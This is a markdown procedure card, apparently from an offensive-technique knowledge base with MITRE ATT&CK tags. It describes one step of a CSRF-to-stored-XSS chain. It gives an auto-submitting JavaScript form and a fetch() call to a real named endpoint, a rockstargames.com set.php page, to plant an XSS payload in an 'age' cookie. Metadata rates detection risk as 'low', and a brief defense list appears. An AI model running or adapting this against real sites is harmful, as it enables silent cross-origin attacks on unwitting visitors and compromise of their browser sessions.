---
id: proc-uuid-002
name: Submit-CSRF-Form-via-JavaScript
tags:
  - csrf
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:57.071Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Submit-CSRF-Form-via-JavaScript

## Summary

This procedure automates the submission of the CSRF form using JavaScript to set the malicious age cookie without requiring user interaction.

## Description

Building on the crafted HTML, this step adds JavaScript to submit the form immediately upon page load. The target is the vulnerable set.php endpoint lacking CSRF protection, allowing the POST to succeed cross-origin. This stores the XSS payload in the age cookie persistently. Expected outcome is the cookie being set, verifiable via browser dev tools.

## Requirements

1. The HTML from the previous procedure
2. JavaScript enabled in victim's browser
3. No additional tools; runs client-side

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens validated server-side
- Set HttpOnly on sensitive cookies to block JS access
- Log and alert on unexpected POSTs from unknown origins

## Objectives

1. Trigger automatic form submission
2. Confirm cookie set via network inspection
3. Prepare for XSS trigger in next step

## Instructions

### Step 1: Add Submission Script

**Context**: Insert JS to submit the form on load.

**Code**:
```html
<script>
document.addEventListener('DOMContentLoaded', function() {
  document.getElementById('csrf-form').submit();
});
</script>
```

> Add this before </body>. When the page loads, the form POSTs to set.php, setting the age cookie.

### Step 2: Test Submission

**Context**: Load the page and inspect network tab.

**Code**:
```javascript
// In browser console, after load
fetch('http://www.rockstargames.com/php/videoplayer_cache/set.php', {
  method: 'POST',
  body: new URLSearchParams({age: '<payload>'})
});
```

> Expected output: 200 OK response, age cookie in application storage. Success if cookie appears with payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[JavaScript]]
